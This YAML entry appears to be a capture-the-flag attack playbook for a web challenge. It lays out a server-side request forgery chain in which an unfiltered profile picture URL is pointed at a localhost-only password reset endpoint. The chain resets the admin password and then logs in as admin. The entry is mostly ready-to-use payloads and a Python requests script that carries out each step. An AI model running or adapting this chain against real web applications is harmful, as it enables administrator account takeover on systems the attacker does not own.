name: ssrf_internal_password_reset
category: web
tags: [ssrf, password_reset, internal_endpoint, urllib]
indicators:
  - "Uses urllib.request.urlretrieve() to fetch remote resources"
  - "Internal-only sensitive endpoint exists"
  - "URL parameter has no filtering for internal addresses"

tricks:
  - name: "Step 1: Identify SSRF vulnerability"
    when: "Analyze source code"
    how: "profile_picture_url passed to urlretrieve() without filtering"
    payload: |
      profile_picture_url=http://127.0.0.1/internal_endpoint

  - name: "Step 2: Discover internal endpoint"
    when: "Analyze source code"
    how: "/reset_password only allows 127.0.0.1 access"
    payload: |
      /reset_password?username=admin&newpassword=xxx

  - name: "Step 3: SSRF to access internal endpoint"
    when: "Exploit SSRF"
    how: "Use profile_picture_url to trigger SSRF and reset admin password"
    payload: |
      http://127.0.0.1/reset_password?username=admin&newpassword=pwned

  - name: "Step 4: Extract the flag"
    when: "Execute attack"
    how: "Register user -> SSRF reset admin password -> Login as admin"
    payload: |
      s = requests.Session()
      s.post(f"{TARGET}/register", data={"username": "attacker", "password": "pass"})
      s.post(f"{TARGET}/login", data={"username": "attacker", "password": "pass"})
      
      ssrf_url = "http://127.0.0.1/reset_password?username=admin&newpassword=pwned"
      s.post(f"{TARGET}/profile", data={"profile_picture_url": ssrf_url})
      
      s2 = requests.Session()
      s2.post(f"{TARGET}/login", data={"username": "admin", "password": "pwned"})
      resp = s2.get(f"{TARGET}/profile")  # Flag here

